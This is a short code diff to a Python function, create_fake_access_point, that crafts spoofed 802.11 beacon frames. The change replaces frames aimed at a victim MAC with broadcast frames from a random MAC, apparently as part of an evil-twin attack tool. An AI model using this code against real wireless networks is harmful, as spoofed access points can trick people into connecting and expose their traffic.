@@ -17,7 +17,11 @@ def create_fake_access_point(WifiAdapter , MacAd , Victim_MA , ChosenWifiSSID):
     # SSID (name of access point)
     # ssid = "AYA - Amir Hetzroni"
     # 802.11 frame
-    dot11 = Dot11(type=0, subtype=8, addr1=Victim_MA, addr2=MacAd, addr3=MacAd)
+
+    # dot11 = Dot11(type=0, subtype=8, addr1=Victim_MA, addr2=MacAd, addr3=MacAd)
+
+    mac = RandMAC()
+    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
     # beacon layer
     beacon = Dot11Beacon()
     # putting ssid in the frame
